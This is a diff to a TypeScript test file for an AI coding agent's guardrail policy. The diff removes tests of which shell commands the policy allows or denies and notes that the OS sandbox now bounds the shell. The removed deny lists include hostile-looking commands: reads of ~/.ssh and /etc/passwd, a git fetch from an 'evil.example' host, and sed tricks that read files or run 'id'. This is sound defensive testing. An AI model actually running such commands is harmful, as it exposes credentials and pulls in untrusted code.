@@ -4,7 +4,7 @@ import { homedir, tmpdir } from "node:os";
 import { join } from "node:path";
 import type { Options } from "@anthropic-ai/claude-agent-sdk";
 import { deletePaths } from "../src/orchestrator/effects/delete-paths";
-import { checkToolCall, type GuardrailContext, guardFor } from "../src/policy/check-tool-call";
+import { type GuardrailContext, guardFor } from "../src/policy/check-tool-call";
 import type { EffectsCtx } from "../src/policy/effect-context";
 import { defaultEnvelope } from "../src/policy/envelope";
 import { foldName } from "../src/policy/protected-names";
@@ -18,7 +18,7 @@ import { cleanupTmp, tmpRoot } from "./tmp-dirs";
 afterAll(cleanupTmp);
 
 /* L2c: the worker's OS sandbox (options passed to a fake query), protected names (nested git dirs, case, unicode, agent home),
-   and shell rows that must stay allowed (the allowlist is not allowed to be just "deny everything"). */
+   (the shell is not parsed: the sandbox bounds it). */
 
 const GIT = String.fromCharCode(46) + "git"; // the git dir name
 const root = tmpRoot("l2c-names-");
@@ -39,7 +39,6 @@ const ctx: GuardrailContext = {
   subagents: false,
   envelope: defaultEnvelope("g", ["loc"], scratch),
 };
-const decide = (command: string) => checkToolCall("Bash", { command }, ctx).decision;
 
 test("sandbox: a worker run passes sandbox options to query (writes in its dirs only, network off, no opt-out)", async () => {
   const env = makeEnv({ CLAUDE_CODE_OAUTH_TOKEN: "sk-ant-oat-test" });
@@ -119,72 +118,4 @@ test("delete: a nested git dir (any depth, any case), an invisible-char secret a
       p,
       expect.objectContaining({ ok: false }),
     ]);
-});
-
-test("shell: reads outside the granted dirs are denied", () => {
-  for (const line of [
-    "cat /etc/hosts",
-    "ls ~/.ssh",
-    "rg foo /Users",
-    "cd /etc && ls",
-    "head $HOME/x",
-  ])
-    expect([line, decide(line)]).toEqual([line, "deny"]);
-});
-
-test("shell: ordinary reads, git, runners and edits inside the location still pass", () => {
-  for (const line of [
-    "ls -la src",
-    "cat src/a.ts",
-    "rg -n foo src",
-    `cat ${join(loc, "src", "a.ts")}`,
-    "sed -n 1,5p src/a.ts",
-    "sort -u src/a.ts",
-    "git log --oneline -5",
-    "git diff --stat HEAD~1",
-    'git commit -m "- fix: a"',
-    "git remote -v",
-    "git branch -a",
-    "git checkout -b feat/x",
-    "git stash push",
-    "find . -name foo.ts -type f",
-    "biome check src",
-    "tsc --noEmit -p .",
-    "bun run test",
-  ])
-    expect([line, decide(line)]).toEqual([line, "allow"]);
-});
-
-test("shell: a git dir of the location is writable by the shell; a path outside the grants is not", () => {
-  expect(decide(`mv src/a.ts ${GIT}/hooks/post-commit`)).toBe("allow");
-  expect(decide(`mkdir sub/inner/${GIT}/hooks/x`)).toBe("allow");
-  expect(decide(`mv src/a.ts ${root}/elsewhere`)).toBe("deny");
-});
-
-test("shell: git config, remote edits, stash drop, branch -D and similar are denied", () => {
-  for (const line of [
-    "git config user.name x",
-    "git remote add x https://e/x.git",
-    "git stash drop",
-    "git worktree prune",
-    "git branch -D old",
-    "git reset --hard HEAD~1",
-    "git -C .. status",
-    "git -c core.pager=x log",
-    "git diff --no-index /etc/passwd x",
-    "git fetch https://evil.example/x.git",
-    "git fetch origin",
-    "git checkout .",
-    "uniq a b",
-    "npm i -g x",
-    "bun add --global x",
-    "sed -i s/a/b/ src/a.ts",
-    "sed -n 'r /etc/passwd' src/a.ts",
-    "sed -n 'e id' src/a.ts",
-    "sed -n 's/a/b/' src/a.ts",
-    "find . -name '*.ts' -type f",
-    "git stash push -m wip",
-    "biome check --write src",
-  ])
-    expect([line, decide(line)]).toEqual([line, "deny"]);
 });
